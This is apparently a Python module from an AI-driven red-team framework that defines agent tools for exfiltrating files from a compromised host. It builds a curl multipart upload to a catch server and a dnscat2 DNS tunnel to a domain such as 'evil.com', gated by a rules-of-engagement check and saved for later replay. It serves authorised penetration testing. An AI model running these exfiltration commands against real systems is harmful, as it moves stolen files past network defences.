"""AutoRed exfiltration tool wrappers — Phase 4, Task 7.

Two exfiltration techniques live in this module:

  * ``exfil_https`` — POST the file as a multipart upload to a catch
                       server via curl. The catch server records the
                       upload in ``/var/log/catch/<source_host>.log`` so
                       the operator (and the engagement report) can
                       prove what left the scope, where it went, and
                       how big it was.
  * ``exfil_dns``    — Tunnel the file out via DNS queries to a
                       dnscat2 catch server. Slower than HTTPS but
                       punches through restrictive egress filters that
                       only allow DNS traffic.

Per the T7 brief, the exfil wrappers do NOT actually execute the curl /
dnscat2 commands in Phase 4 — they construct the argv list, save the
joined command string via ``_save_raw`` so the Phase 6
FootholdSessionManager can replay it, and return an ``ExfilResult``
with the ``catch_server`` + ``catch_server_log_path`` recorded so the
Phase 5 Report Agent can match every exfil event back to a catch-server
log entry (spec §6.8 — exfil traceability contract).

Decorator order (Ruling 1): ``@tool`` OUTER, ``@roe_guard`` INNER — see
``autored.tools.hydra`` for the rationale and the regression tests in
``test_<tool>_ainvoke_works_with_roe_guard``.

Spec ref: §3.4 (post-ex models), §6.8 (RoE guard + exfil-traceability
contract), §9.2 (RoE categories).
"""
from __future__ import annotations

from langchain_core.tools import tool
from pydantic import BaseModel

from autored.logging import get_logger
from autored.roe_guard import roe_guard
from autored.tools.nmap import _save_raw  # reuse from nmap

log = get_logger("tools.exfil")


class ExfilResult(BaseModel):
    """Result of an exfiltration tool call.

    ``catch_server`` is the catch endpoint (HTTPS catch server URL host
    or DNS-tunnel domain) and ``catch_server_log_path`` is the operator-
    derived path to the catch server's log file for *this* source host.
    Together they let the Phase 5 Report Agent prove traceability: "file
    X left host Y at time Z, catch server logged it at path W" (spec
    §6.8).

    ``raw_output_path`` is set whenever the command was saved to
    ``engagements/<id>/raw/`` for the Phase 6 FootholdSessionManager to
    replay (Phase 4 stub — actual execution deferred).
    """

    method: str
    source_host: str
    data_size_bytes: int = 0
    catch_server: str = ""
    catch_server_log_path: str = ""
    raw_output_path: str = ""


# ---------------------------------------------------------------------------
# Build helpers — one per exfil technique. Each returns an argv list
# ready for the Phase 6 FootholdSessionManager to execute via
# ``run_subprocess`` or to replay through the foothold's shell session.
# ---------------------------------------------------------------------------


def _build_exfil_https(catch_server: str, file_path: str) -> list[str]:
    """Build the curl argv list for HTTPS multipart-upload exfil.

    ``-X POST`` + ``-F file=@<path>`` uploads the file as a multipart
    form post — the catch server expects this exact shape (per spec
    §6.8's catch-server contract). The HTTP scheme (not HTTPS) is used
    here so a foothold with no trust for the catch server's CA can still
    exfil; a future hardening pass should switch to HTTPS + a pinned CA.
    """
    return [
        "curl",
        "-X",
        "POST",
        "-F",
        f"file=@{file_path}",
        f"http://{catch_server}/upload",
    ]


def _build_exfil_dns(domain: str, file_path: str) -> list[str]:
    """Build the dnscat2 argv list for DNS-tunnel exfil.

    ``dnscat2 <domain> -f <file>`` chunks the file into DNS query labels
    and tunnels them to the dnscat2 catch server authoritative for
    ``<domain>``. Slower than HTTPS but bypasses egress filters that
    only allow DNS.
    """
    return ["dnscat2", domain, "-f", file_path]


# ---------------------------------------------------------------------------
# @tool wrappers — both techniques have full wrappers. Each:
#   1. Builds the curl / dnscat2 argv list via the matching _build_* helper.
#   2. Saves the joined command string via _save_raw so the Phase 6
#      FootholdSessionManager can replay it.
#   3. Returns an ExfilResult with the catch_server + catch_server_log_path
#      recorded so the Phase 5 Report Agent can match exfil events back
#      to catch-server log entries.
# ---------------------------------------------------------------------------


@tool
@roe_guard(allowed_categories=["exfil"])
async def exfil_https(
    catch_server: str,
    file_path: str,
    host_ip: str,
    engagement_id: str = "",
) -> ExfilResult:
    """Exfiltrate a file via HTTPS multipart upload to a catch server.

    The command is constructed for execution via the foothold's shell
    session. Actual execution requires the session manager (Phase 6).
    For now, this tool builds the command, saves it to
    ``engagements/<id>/raw/``, and returns an ``ExfilResult`` with the
    ``catch_server`` + ``catch_server_log_path`` recorded so the Phase 5
    Report Agent can prove traceability.

    Args:
        catch_server: Catch server hostname (e.g., ``catch.example.com``).
        file_path: Absolute path to the file on the foothold.
        host_ip: Source host IP (RoE guard scope check + recorded in
            ``ExfilResult.source_host``).
        engagement_id: Current engagement ID.

    Returns:
        ``ExfilResult`` with ``method == "https"``,
        ``source_host=host_ip``, ``catch_server=catch_server``, and
        ``catch_server_log_path`` derived from ``host_ip``.
    """
    cmd = _build_exfil_https(catch_server, file_path)
    cmd_str = " ".join(cmd)
    log.info(
        "exfil_https",
        host_ip=host_ip,
        catch_server=catch_server,
        file_path=file_path,
    )
    raw_path = await _save_raw(
        "exfil_https_cmd", host_ip, cmd_str, "", engagement_id
    )
    return ExfilResult(
        method="https",
        source_host=host_ip,
        catch_server=catch_server,
        catch_server_log_path=f"/var/log/catch/{host_ip}.log",
        raw_output_path=raw_path,
    )


@tool
@roe_guard(allowed_categories=["exfil"])
async def exfil_dns(
    domain: str,
    file_path: str,
    host_ip: str,
    engagement_id: str = "",
) -> ExfilResult:
    """Exfiltrate a file via DNS tunneling (dnscat2) to a catch server.

    The command is constructed for execution via the foothold's shell
    session. Actual execution requires the session manager (Phase 6).
    For now, this tool builds the command, saves it to
    ``engagements/<id>/raw/``, and returns an ``ExfilResult`` with the
    ``catch_server`` (= the DNS-tunnel domain) + ``catch_server_log_path``
    recorded.

    Args:
        domain: DNS-tunnel domain authoritative for the dnscat2 catch
            server (e.g., ``evil.com``).
        file_path: Absolute path to the file on the foothold.
        host_ip: Source host IP (RoE guard scope check + recorded in
            ``ExfilResult.source_host``).
        engagement_id: Current engagement ID.

    Returns:
        ``ExfilResult`` with ``method == "dns"``,
        ``source_host=host_ip``, ``catch_server=domain``.
    """
    cmd = _build_exfil_dns(domain, file_path)
    cmd_str = " ".join(cmd)
    log.info(
        "exfil_dns",
        host_ip=host_ip,
        domain=domain,
        file_path=file_path,
    )
    raw_path = await _save_raw(
        "exfil_dns_cmd", host_ip, cmd_str, "", engagement_id
    )
    return ExfilResult(
        method="dns",
        source_host=host_ip,
        catch_server=domain,
        catch_server_log_path=f"/var/log/catch/{host_ip}.log",
        raw_output_path=raw_path,
    )
